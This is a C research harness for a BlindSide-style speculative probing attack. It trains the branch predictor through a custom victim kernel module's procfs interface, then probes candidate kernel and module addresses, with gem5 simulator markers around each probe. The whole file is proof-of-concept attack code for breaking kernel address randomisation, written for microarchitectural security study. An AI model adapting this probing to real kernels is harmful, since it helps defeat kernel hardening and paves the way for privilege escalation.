//
// Created by shixinsong on 10/6/23.
//
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include "m5ops.h"

#define PROCFS_NAME "blindside_victim"
#define NUM_TRAIN 1

#define START_KERNEL 0xffffff8000000000
#define START_KERNEL_MODULE 0xffffff8040000000
#define ALIGN 0x80000000
#define NUM_OFFSETS 32

#define TEST_ONE


typedef struct blindside_command_t {
    unsigned long f_ptr;
    unsigned long idx;
} blindside_command;


static inline void call_kernel(int kernel_fd, uint64_t test_addr, uint64_t idx) {
    blindside_command local_cmd;
    local_cmd.f_ptr = test_addr;
    local_cmd.idx = idx;

    write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
}


void test_one_address(int kernel_fd, size_t test_addr) {
    uint64_t i;

    // Train the branch predictor
    for (i = 0; i < NUM_TRAIN; i++) {
        call_kernel(kernel_fd, 0, i);
    }

    // Start Probing
    printf("Test addr: %lx\n", test_addr);
//    m5_reset_stats(0, 0);
    m5_work_begin(0, 0);
    call_kernel(kernel_fd, test_addr, NUM_TRAIN);
    m5_work_end(0, 0);
    // End Probing
}

int main(int argc, char *argv[]) {
    uint64_t i = 0;
    char *end;
    int kernel_fd;
    int probe_module = 0;
    uint64_t entry_syscall_64 = 0x800040;
    uint64_t module_rela_dist = 0x3;
//    uint64_t gadget_relative_dist;

    kernel_fd = open("/proc/" PROCFS_NAME, O_RDWR);
    if (kernel_fd < 0) {
        perror("Problem connecting to the kernel module- did you install it?\n");
        exit(EXIT_FAILURE);
    }

//    m5_work_begin(0, 0);
    if (argc > 1) {
        probe_module = atoi(argv[1]);
    }
//    m5_work_end(0, 0);

#ifdef TEST_ONE
    if (argc > 2) {
        i = strtoull(argv[2], &end, 10);
    }
    if (probe_module) {
        test_one_address(kernel_fd, START_KERNEL_MODULE + module_rela_dist + i * ALIGN);
    } else {
        test_one_address(kernel_fd, START_KERNEL + entry_syscall_64 + i * ALIGN);
    }
#else
    if (probe_module) {
        for (i = 0; i < NUM_OFFSETS; i++) {
            test_one_address(kernel_fd, START_KERNEL_MODULE + module_rela_dist + i * ALIGN);
        }
    } else {
        for (i = 0; i < NUM_OFFSETS; i++) {
            test_one_address(kernel_fd, START_KERNEL + entry_syscall_64 + i * ALIGN);
        }
    }
#endif
}
